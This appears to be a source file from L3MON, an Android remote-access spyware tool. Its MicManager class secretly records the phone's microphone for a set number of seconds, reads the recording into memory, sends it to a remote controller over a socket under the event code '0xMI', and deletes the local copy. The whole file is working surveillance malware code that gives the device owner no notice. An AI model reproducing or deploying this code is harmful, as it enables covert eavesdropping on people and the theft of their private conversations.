package com.etechd.l3mon.features.mic;

import android.media.MediaRecorder;
import android.util.Log;

import com.etechd.l3mon.core.L3monApp;
import com.etechd.l3mon.core.network.SocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class MicManager {

    private static final String TAG = "MicManager";
    private static MediaRecorder recorder;
    private static File audioFile;
    private static TimerTask stopRecordingTask;

    public static void startRecording(int seconds) {
        try {
            File cacheDir = L3monApp.getContext().getCacheDir();
            if (cacheDir == null) {
                Log.e(TAG, "Cache directory is null");
                return;
            }

            audioFile = File.createTempFile("sound", ".mp4", cacheDir);

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());

            recorder.prepare();
            recorder.start();

            stopRecordingTask = new TimerTask() {
                @Override
                public void run() {
                    stopAndSendRecording();
                }
            };
            new Timer().schedule(stopRecordingTask, seconds * 1000L);

        } catch (IOException e) {
            Log.e(TAG, "Error creating audio file", e);
        } catch (Exception e) {
            Log.e(TAG, "Recorder prepare/start error", e);
        }
    }

    private static void stopAndSendRecording() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;

                if (audioFile != null && audioFile.exists()) {
                    sendVoice(audioFile);
                    if (!audioFile.delete()) {
                        Log.w(TAG, "Failed to delete temp audio file");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping/releasing recorder", e);
        }
    }

    private static void sendVoice(File file) {
        try {
            if (file == null || !file.exists()) {
                Log.e(TAG, "Audio file is null or missing");
                return;
            }

            int size = (int) file.length();
            byte[] data = new byte[size];
            try (BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file))) {
                int readBytes = buf.read(data);
                if (readBytes != size) {
                    Log.e(TAG, "Incomplete read of audio file");
                }
            }

            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            SocketClient.getInstance().getSocket().emit("0xMI", object);

        } catch (IOException | JSONException e) {
            Log.e(TAG, "Error sending voice recording", e);
        }
    }
}
